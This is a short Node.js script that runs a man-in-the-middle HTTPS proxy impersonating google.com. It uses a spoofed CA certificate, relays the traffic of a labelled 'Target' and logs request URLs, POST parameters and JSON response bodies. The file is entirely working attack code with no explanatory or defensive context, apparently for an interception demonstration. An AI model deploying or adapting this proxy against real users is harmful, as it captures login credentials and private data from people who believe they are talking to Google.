const https = require('https');
const http = require('http');
const fs = require('fs');
const { parse } = require('querystring');
const proxy = require('http-proxy').createProxyServer({
    target: 'https://google.com'
});

https.createServer({
    key: fs.readFileSync('../../certs/cert.key'),
    cert: fs.readFileSync('../../certs/cert.crt'),
    ca: [
        fs.readFileSync('../../certs/spoofed_ca.crt')
    ]
}, function (req, res, next) {
    console.log("Request!");

    proxy.web(req, res, {
        target: 'https://google.com'
    }, next);
})
.listen(443);


// http.createServer({}, function (req, res, next) {
//     console.log("Request!");

//     proxy.web(req, res, {
//         target: 'http://andrej-mohar.com'
//     }, next);
// })
// .listen(8000);

proxy.on('proxyReq', function(proxyReq, req, res, options) {
    console.log("");
    console.log("===============================");
    console.log("       Target --> Google");
    console.log("===============================");
    console.log("");
    console.log("URL:         " + req.url);
    if (req.method == "POST") {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            console.log("POST params: ");
            console.log(parse(body));
        });
    }
});

proxy.on('proxyRes', function(proxyRes, req, res, options) {
    console.log("");
    console.log("===============================");
    console.log("       Google --> Target");
    console.log("===============================");
    console.log("");
    if (proxyRes.headers["content-type"] && proxyRes.headers["content-type"].indexOf("json") != -1) {
        let body = '';
        proxyRes.on('data', chunk => {
            body += chunk.toString();
        });
        proxyRes.on('end', () => {
            console.log("JSON body: " + body);
        });
    } else {
        console.log('HTML data.')
    }
});


console.log("Created.");